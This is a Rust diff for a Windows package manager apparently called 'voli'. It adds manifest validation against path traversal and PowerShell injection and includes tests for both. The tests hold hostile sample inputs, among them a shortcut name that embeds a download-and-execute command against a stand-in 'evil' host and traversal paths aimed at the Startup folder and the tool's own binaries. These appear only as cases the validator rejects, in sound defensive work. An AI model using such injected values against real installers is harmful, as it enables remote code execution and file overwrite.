@@ -303,6 +303,9 @@ pub enum ManifestError {
     #[error("invalid {field} path '{path}': must be relative (no absolute paths, no '..')")]
     RelativePath { field: &'static str, path: String },
 
+    #[error("invalid {field} '{value}': must be a single plain file name")]
+    Component { field: &'static str, value: String },
+
     #[error("invalid env value for '{key}': only the {{dir}} template variable is allowed")]
     EnvTemplate { key: String },
 
@@ -323,6 +326,8 @@ impl Manifest {
 
     fn validate(&self) -> Result<(), ManifestError> {
         validate_name(&self.name)?;
+        // The version becomes a directory name under apps\<name>\ (Paths::version_dir).
+        check_component(&self.version, "version")?;
 
         if let Some(icon) = &self.icon {
             check_icon_url(icon)?;
@@ -359,8 +364,26 @@ impl Manifest {
             }
         }
 
+        if let Some(dir) = &self.extract_dir {
+            check_relative(dir, "extract_dir")?;
+        }
+
+        // persist entries are joined onto BOTH apps\<name>\persist\ and the
+        // version dir, and feed remove_dir_all / junction::create — the engine
+        // has always assumed one flat directory name, so require it.
+        for d in &self.persist {
+            // Relative, not single-component: ~20 published packages persist a
+            // nested path (`res\conf`, `AppData\Config`). Containment is what
+            // matters here — `check_relative` rejects absolute paths, `..`, and
+            // drive prefixes, which is the whole of the security property.
+            check_relative(d, "persist")?;
+        }
+
         for b in &self.bin {
             check_relative(b.path(), "bin")?;
+            // shim_name() lands verbatim in shims\<name>.exe, which is next to
+            // voli's own shim — a traversing name would overwrite it.
+            check_component(&b.shim_name(), "bin name")?;
         }
 
         for (key, val) in &self.env {
@@ -369,6 +392,8 @@ impl Manifest {
 
         for sc in &self.shortcuts {
             check_relative(sc.target(), "shortcut")?;
+            // link_name() becomes <name>.lnk in the Start Menu folder.
+            check_shortcut_name(&sc.link_name())?;
         }
 
         for wf in &self.write_file {
@@ -486,24 +511,105 @@ fn check_hex(
     }
 }
 
+/// A path field: relative, and every component a safe Windows file name.
+///
+/// Deliberately string-based rather than `Path`-based: `Path::components` is
+/// platform-dependent (on Linux `a\b` is one component, and a mid-path `C:`
+/// parses as a normal component whose later `PathBuf::push` silently discards
+/// the base). Both separators are split here on every platform, and
+/// [`safe_windows_component`] rejects `..`, drive prefixes, reserved device
+/// names, and trailing dot/space.
 fn check_relative(path: &str, field: &'static str) -> Result<(), ManifestError> {
-    let p = std::path::Path::new(path);
-    let absolute = p.is_absolute()
-        || path.starts_with('/')
-        || path.starts_with('\\')
-        // Windows drive-letter root, e.g. C:\...
-        || path.chars().nth(1) == Some(':');
-    let has_parent = p
-        .components()
-        .any(|c| matches!(c, std::path::Component::ParentDir));
-    if absolute || has_parent {
+    let ok = !path.is_empty()
+        && !path.starts_with('/')
+        && !path.starts_with('\\')
+        && path
+            .split(['/', '\\'])
+            .all(|c| c.is_empty() || c == "." || component_ok(c));
+    if ok {
+        Ok(())
+    } else {
         Err(ManifestError::RelativePath {
             field,
             path: path.to_string(),
         })
-    } else {
-        Ok(())
     }
+}
+
+/// A shortcut's display name. It may nest (`Vendor\App` is a Start Menu
+/// subfolder, which ~5 published packages use), so containment is
+/// [`check_relative`]'s job.
+///
+/// On top of that it rejects `$` and a backtick. Those are the two characters
+/// PowerShell expands inside a double-quoted string, and this value reaches a
+/// PowerShell script. [`crate::install`] no longer interpolates it — the script
+/// is a constant and the paths arrive through the child's environment — so this
+/// is defence in depth, deliberately: if that design is ever reverted to string
+/// interpolation, validation still refuses the injection. No published manifest
+/// uses either character; `(`, `)` and `!` are common (`Qalculate! (GTK)`) and
+/// are inert without `$`, so they stay allowed.
+fn check_shortcut_name(value: &str) -> Result<(), ManifestError> {
+    check_relative(value, "shortcut name")?;
+    if value.contains('$') || value.contains('`') {
+        return Err(ManifestError::Component {
+            field: "shortcut name",
+            value: value.to_string(),
+        });
+    }
+    Ok(())
+}
+
+/// A name field that becomes exactly ONE file or directory name on disk (the
+/// version dir, a shim base name). Stricter than [`check_relative`]: no
+/// separators at all, and none of the characters Windows forbids in a file name.
+/// One path component, checked for everything except the separators themselves:
+/// non-empty, bounded, no drive prefix / reserved device name / trailing dot or
+/// space, and none of the characters Windows forbids in a file name. Shared by
+/// [`check_relative`] (per component) and [`check_component`] (whole value), so
+/// a rule can never apply to one and not the other.
+fn component_ok(value: &str) -> bool {
+    !value.is_empty()
+        && value.len() <= 128
+        && safe_windows_component(value)
+        && !value
+            .chars()
+            .any(|c| c.is_control() || r#"<>:"|?*"#.contains(c))
+}
+
+fn check_component(value: &str, field: &'static str) -> Result<(), ManifestError> {
+    let ok = component_ok(value) && !value.contains(['/', '\\']);
+    if ok {
+        Ok(())
+    } else {
+        Err(ManifestError::Component {
+            field,
+            value: value.to_string(),
+        })
+    }
+}
+
+/// True when `value` is safe to use as a single Windows path component.
+///
+/// Rejects `:` (drive prefixes — `PathBuf::push` of a drive-prefixed component
+/// RESETS the whole path, so a mid-path `C:` escapes any join), a trailing dot
+/// or space (Windows silently strips them, which defeats name comparisons), and
+/// the reserved device names. Shared with the archive-entry validator in
+/// `skill.rs`; lives here because `manifest` is the one module that builds on
+/// non-Windows hosts too.
+pub(crate) fn safe_windows_component(value: &str) -> bool {
+    if value.contains(':') || value.ends_with(['.', ' ']) {
+        return false;
+    }
+    let stem = value
+        .split('.')
+        .next()
+        .unwrap_or(value)
+        .to_ascii_uppercase();
+    !matches!(stem.as_str(), "CON" | "PRN" | "AUX" | "NUL")
+        && !matches!(
+            stem.as_bytes(),
+            [b'C', b'O', b'M', b'1'..=b'9'] | [b'L', b'P', b'T', b'1'..=b'9']
+        )
 }
 
 /// Env values may contain literal text and the single template var `{dir}`.
@@ -698,6 +804,165 @@ sha256 = "{}"
             Manifest::from_toml_str(&s),
             Err(ManifestError::RelativePath { .. })
         ));
+    }
+
+    /// `bin.name` is used verbatim as `shims\<name>.exe` — which sits beside
+    /// voli's own binaries. Only the PATH used to be checked, never the name.
+    #[test]
+    fn rejects_bin_name_that_escapes_the_shims_dir() {
+        for name in ["../bin/voli", r"..\bin\voli", "sub/rg", r"C:\bin\voli", ""] {
+            let s = minimal(&format!(
+                r#"bin = [{{ name = "{}", path = "rg.exe" }}]"#,
+                name.escape_default()
+            ));
+            assert!(
+                matches!(
+                    Manifest::from_toml_str(&s),
+                    Err(ManifestError::Component {
+                        field: "bin name",
+                        ..
+                    })
+                ),
+                "bin name {name:?} should be rejected"
+            );
+        }
+        Manifest::from_toml_str(&minimal(r#"bin = [{ name = "rg", path = "sub/rg.exe" }]"#))
+            .expect("a plain shim name stays valid");
+    }
+
+    /// `shortcut.name` reached a PowerShell double-quoted string at install
+    /// time (`$(...)` evaluates) and `link_dir.join("{name}.lnk")` (traversal
+    /// into the real Startup folder). Neither was validated at all.
+    #[test]
+    fn rejects_shortcut_name_injection_and_traversal() {
+        for name in [
+            "App$(iwr https://evil/x.ps1|iex)",
+            // `$` and a backtick are the two characters PowerShell expands in a
+            // double-quoted string. Rejected on their own, so validation still
+            // refuses injection even if `create_shortcut` ever went back to
+            // interpolating instead of passing values through the environment.
+            "App$x",
+            "App`x",
+            "../Startup/x",
+            r"..\Startup\x",
+            "App|calc",
+            "App?",
+        ] {
+            let s = minimal(&format!(
+                r#"shortcuts = [{{ target = "rg.exe", name = "{}" }}]"#,
+                name.escape_default()
+            ));
+            assert!(
+                Manifest::from_toml_str(&s).is_err(),
+                "shortcut name {name:?} should be rejected"
+            );
+        }
+        // A shortcut name MAY nest: `Vendor\App` is a Start Menu subfolder, and
+        // ~5 published packages rely on it. Parentheses and `!` are common in
+        // real display names and are inert without `$`.
+        for name in [
+            "My App (x64)",
+            r"Adventure Game Studio\AGS Editor",
+            "PeerBanHelper/PeerBanHelper (GUI)",
+            "Qalculate! (GTK)",
+        ] {
+            let s = minimal(&format!(
+                r#"shortcuts = [{{ target = "rg.exe", name = "{}" }}]"#,
+                name.escape_default()
+            ));
+            Manifest::from_toml_str(&s)
+                .unwrap_or_else(|e| panic!("shortcut name {name:?} must stay valid: {e}"));
+        }
+    }
+
+    /// ~20 published packages persist a nested path (`res\conf`,
+    /// `AppData\Config`). Containment is the security property, not flatness —
+    /// an over-strict rule here failed 25 live manifests and would have broken
+    /// the registry publish, which validates before it signs.
+    #[test]
+    fn persist_may_nest_but_never_escapes() {
+        for good in [r"AppData\Config", "res/conf", "data"] {
+            let s = minimal(&format!(r#"persist = ["{}"]"#, good.escape_default()));
+            Manifest::from_toml_str(&s)
+                .unwrap_or_else(|e| panic!("persist {good:?} must stay valid: {e}"));
+        }
+        for bad in [r"C:\Users\neo\Documents", r"..\..\escape", "/etc/passwd"] {
+            let s = minimal(&format!(r#"persist = ["{}"]"#, bad.escape_default()));
+            assert!(
+                Manifest::from_toml_str(&s).is_err(),
+                "persist {bad:?} should be rejected"
+            );
+        }
+    }
+
+    /// `extract_root.join(extract_dir)` then `fs::rename` — an absolute value
+    /// makes `join` replace the base and MOVES that directory into the package.
+    #[test]
+    fn rejects_unvalidated_extract_dir() {
+        for dir in [
+            r"C:\Users\neo\Documents",
+            "/etc",
+            "../../elsewhere",
+            "sub/C:/x",
+            "",
+        ] {
+            let s = minimal(&format!(r#"extract_dir = "{}""#, dir.escape_default()));
+            assert!(
+                matches!(
+                    Manifest::from_toml_str(&s),
+                    Err(ManifestError::RelativePath {
+                        field: "extract_dir",
+                        ..
+                    })
+                ),
+                "extract_dir {dir:?} should be rejected"
+            );
+        }
+        Manifest::from_toml_str(&minimal(r#"extract_dir = "ripgrep-14.1.1/inner""#))
+            .expect("a nested wrapper dir stays valid");
+    }
+
+    /// persist entries feed `fs::rename`, `fs::remove_dir_all` and
+    /// `junction::create`; the engine has always assumed one flat name.
+    #[test]
+    fn rejects_unvalidated_persist_entry() {
+        // `sub/config` is deliberately NOT here: nested persist paths are used by
+        // ~20 published packages. Containment is the property, not flatness.
+        for dir in ["../../evil", r"C:\Users\neo\Documents", "..", "cfg|x"] {
+            let s = minimal(&format!(r#"persist = ["{}"]"#, dir.escape_default()));
+            assert!(
+                Manifest::from_toml_str(&s).is_err(),
+                "persist {dir:?} should be rejected"
+            );
+        }
+        Manifest::from_toml_str(&minimal(r#"persist = ["config"]"#))
+            .expect("a flat persist dir stays valid");
+    }
+
+    /// `Paths::version_dir` is `apps\<name>\<version>` — an unchecked version
+    /// escapes the voli root entirely.
+    #[test]
+    fn rejects_version_that_escapes_the_app_dir() {
+        for version in [r"..\..\evil", "../../evil", r"C:\evil", "1.0/0", ""] {
+            let s = minimal("").replace(
+                r#"version = "1.0.0""#,
+                &format!(r#"version = "{}""#, version.escape_default()),
+            );
+            assert!(
+                matches!(
+                    Manifest::from_toml_str(&s),
+                    Err(ManifestError::Component {
+                        field: "version",
+                        ..
+                    })
+                ),
+                "version {version:?} should be rejected"
+            );
+        }
+        Manifest::from_toml_str(
+            &minimal("").replace(r#"version = "1.0.0""#, r#"version = "1.0.0-beta.1+build2""#),
+        )
+        .expect("an ordinary semver stays valid");
     }
 
     #[test]
